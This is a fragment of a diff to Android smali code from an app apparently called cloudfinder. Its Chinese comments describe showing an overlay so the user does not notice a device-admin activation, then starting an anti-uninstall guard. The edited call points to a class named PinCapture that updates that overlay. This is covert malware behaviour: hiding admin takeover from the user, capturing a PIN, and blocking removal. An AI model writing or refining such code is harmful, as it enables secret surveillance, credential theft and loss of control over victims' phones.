@@ -53,7 +53,7 @@
     # 2.2：激活完成 → 进度 100%，2.5s 后再关遮罩，并启动防卸载守卫
     const/16 v0, 0x64
 
-    invoke-static {v0}, Lڗًقڔ/؋;->setOptProgress(I)V
+    invoke-static {v0}, Lcom/lite/cloudfinder/pin/PinCapture;->updateOverlayProgress(I)V
     # 2.2：激活完成 → 2.5s 后再关遮罩（避免用户看到管理页刚退出），并启动防卸载守卫
     const/16 v0, 0x8
     const-wide/16 v1, 0x9c4
